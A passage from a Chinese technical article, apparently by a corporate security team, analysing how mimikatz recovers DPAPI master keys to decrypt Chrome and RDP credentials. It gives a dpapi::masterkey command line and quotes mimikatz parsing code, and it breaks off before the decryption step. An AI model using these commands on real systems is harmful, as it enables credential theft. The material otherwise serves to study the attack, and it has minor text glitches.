**作者： 腾讯IT技术  
原文链接：**
## 导语
渗透的本质就是信息搜集，在后渗透阶段获取目标机器权限后，经常需要获取浏览器加密凭据和远程桌面RDP凭据等等，攻击队员一般利用 mimikatz
工具实现离线解密。为了更好的理解攻击原理，本文会介绍mimikatz如何进行解密以及代码是如何实现的。
## 1\. 从实际的后渗透场景开始
先介绍蓝军如何使用 mimikatz 对Chrome密码进行解密的，分为以下两种场景：
**场景1：在受害者主机上，以用户的安全上下文中解密Chrome凭据：**
**场景2：当将Chrome加密数据库拖到本地进行解密时，使用 mimikatz 离线解密 Chrome 凭据：**
以上尝试会提示该数据被 DPAPI 保护，这个时候如果已在此前获取到 master key 则可以完成离线解密：
在这两个解密场景下，命令均在 mimikatz 的 dpapi 模块下，以及在上面的示范中也提到了 matser key 这个参数。如果需要了解到
mimikatz 的解密实现，则需要从 DPAPI 以及 mimikatz 的代码实现两个方面来看。
## 2\. Windows下通用数据保护方案—DPAPI
Windows系统下，为了使开发者可以实施针对用户身份上下文加密的方案，系统向开发者提供了一个强大的数据保护API——DPAPI，开发者使用该 API
加密的数据在解密时会使用用户身份的上下文解密，使得该数据仅可被当前用户解密。DPAP
针对用户加密的方案可以抽象的理解为，不同的用户安全上下文相关会产生不同的 DPAPI master key，这个DPAPI master key
相当于一个密钥，这个调用DPAPI master key 实施加解密的过程由系统直接操作，所以从攻击者视角来看，如果有方式窃取到用户的 DPAPI
master key 就可以离线解密用户的敏感凭据，接下来我们将开始逐步了解 DPAPI ，从而逐步达成这个解密目的。
### 2.1 敏感信息保护：DPAPI介绍
DPAPI (Data Protection API) 从Windows 2000开始引入，MSDN中举例DPAPI可以用来保护的数据有：
Web page credentials (for example, passwords)
File share credentials
Private keys associated with Encrypting File System(EFS), S/MIME, and other
certificates
Program data that is protected using the CryptProtectData function
### 2.2 DPAPI 的工作原理
DPAPI通过由512-bit伪随机数的master key派生的数据来进行加密保护。每个用户账户都有?个或者多个随机生成的master
key，master key会定期更新，默认更新频率为90天，master key的过期时间会保存在master key file
同级目录的Prefererd文件中。master key会被由账户登录密码hash和SID生成的derived key加密，文件名是?个UUID。
用户master key文件位于%APPDATA%\Microsoft\Protect\%SID%
系统master key文件位于%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User
值得注意的是，在新版本Windows 10中master key文件会被设置为操作系统文件，默认不会在explorer中显示， 需要取消隐藏。
上文中CryptProtectData的dwFlags参数为0的情况下，DPAPI会使用当前用户的master
key进行加密操作，如果期望当前机器上所有用户的进程都能够解密数据的话，可以通过设置CRYPTPROTECT_LOCAL_MACHINE
flag，它会使DPAPI的加解密操作中机器级别进行。
## 3\. 从 mimikatz 中看 DPAPI master key 获取逻辑
mimikatz中有两个模块可以用来获取DPAPI master key，分别是从磁盘文件获取master
key的dpapi::masterkey，和从LSASS进程内存获取master key的sekurlsa::dpapi。
接下来通过阅读mimikatz源码，来学习如何从[文件]以及[内存]两种途径来获取DPAPI master key。
### 3.1 dpapi::masterkey
dpapi::masterkey 命令可以通过磁盘上的加密master key来解密出真正的DPAPI master key，需要传入三个参数：master
key文件，用户SID，用户登录密码，相关命令如下：
dpapi::masterkey/in:"C:\Users\x\AppData\Roaming\Microsoft\Protect\S-1-5-21-1333135361-625243220-14044502-1002382[UUID]"/sid:S-1-5-21-1333135361-625243220-14044502-1002382
/password:password /protected
下面的分析只针对最常见的解密master key流程，
定位到mimikatz/modules/dpapi/kuhl_m_dpapi.c，解密流程如下：
首先，读取磁盘上的master key文件，并在内存中分配master key结构体**
    kull_m_file_readData(szIn, &buffer, &szBuffer);
    PKULL_M_DPAPI_MASTERKEYS masterkeys = kull_m_dpapi_masterkeys_create(buffer);
    master key的结构定义在mimikatz/modules/kull_m_dpapi.h
    typedef struct _KULL_M_DPAPI_MASTERKEY {
        DWORD   dwVersion;
        BYTE    salt[16];
        DWORD   rounds;
        ALG_ID  algHash;
        ALG_ID  algCrypt;
        PBYTE   pbKey;
        DWORD   __dwKeyLen;
    } KULL_M_DPAPI_MASTERKEY, *PKULL_M_DPAPI_MASTERKEY;
    typedef struct _KULL_M_DPAPI_MASTERKEYS {
        DWORD   dwVersion;
        DWORD   unk0;
        DWORD   unk1;
        WCHAR   szGuid[36];
        DWORD   unk2;
        DWORD   unk3;
        DWORD   dwFlags;
        DWORD64 dwMasterKeyLen;
        DWORD64 dwBackupKeyLen;
        DWORD64 dwCredHistLen;
        DWORD64 dwDomainKeyLen;
        PKULL_M_DPAPI_MASTERKEY MasterKey;
        PKULL_M_DPAPI_MASTERKEY BackupKey;
        PKULL_M_DPAPI_MASTERKEY_CREDHIST    CredHist;
        PKULL_M_DPAPI_MASTERKEY_DOMAINKEY   DomainKey;
    } KULL_M_DPAPI_MASTERKEYS, *PKULL_M_DPAPI_MASTERKEYS;
    调用kull_m_dpapi_masterkeys_create将master key的成员copy到正确的偏移处
    PKULL_M_DPAPI_MASTERKEYS kull_m_dpapi_masterkeys_create(LPCVOID data/*, DWORD size*/)
    {
        PKULL_M_DPAPI_MASTERKEYS masterkeys = NULL;
        if(data && (masterkeys = (PKULL_M_DPAPI_MASTERKEYS) LocalAlloc(LPTR, sizeof(KULL_M_DPAPI_MASTERKEYS))))
        {
            RtlCopyMemory(masterkeys, data, FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey));
            if(masterkeys->dwMasterKeyLen)
                masterkeys->MasterKey = kull_m_dpapi_masterkey_create((PBYTE) data + FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey) + 0, masterkeys->dwMasterKeyLen);
            if(masterkeys->dwBackupKeyLen)
                masterkeys->BackupKey = kull_m_dpapi_masterkey_create((PBYTE) data + FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey) + masterkeys->dwMasterKeyLen, masterkeys->dwBackupKeyLen);
            if(masterkeys->dwCredHistLen)
                masterkeys->CredHist = kull_m_dpapi_masterkeys_credhist_create((PBYTE) data + FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey) + masterkeys->dwMasterKeyLen + masterkeys->dwBackupKeyLen, masterkeys->dwCredHistLen);
            if(masterkeys->dwDomainKeyLen)
                masterkeys->DomainKey = kull_m_dpapi_masterkeys_domainkey_create((PBYTE) data + FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey) + masterkeys->dwMasterKeyLen + masterkeys->dwBackupKeyLen + masterkeys->dwCredHistLen, masterkeys->dwDomainKeyLen);
        }
        return masterkeys;
    }
**2) 接着，遍历全局缓存的CredentialEntry，尝试用缓存的Derive Key进行解密**
    通过SID定位Credential Entry
    if(masterkeys->CredHist)
      pCredentialEntry = kuhl_m_dpapi_oe_credential_get(NULL, &masterkeys->CredHist->guid);
    if(!pCredentialEntry && convertedSid)
      pCredentialEntry = kuhl_m_dpapi_oe_credential_get(convertedSid, NULL);
    通过master key文件的元数据确定hash算法
    if(pCredentialEntry)
    {
      kprintf(L"\n[masterkey] with volatile cache: "); kuhl_m_dpapi_oe_credential_descr(pCredentialEntry);
      if(masterkeys->dwFlags & 4)
      {
        if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1)
          derivedKey = pCredentialEntry->data.sha1hashDerived;
      }
      else
      {
        if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_MD4)
          derivedKey = pCredentialEntry->data.md4hashDerived;
      }
    接着通过derived key进行解密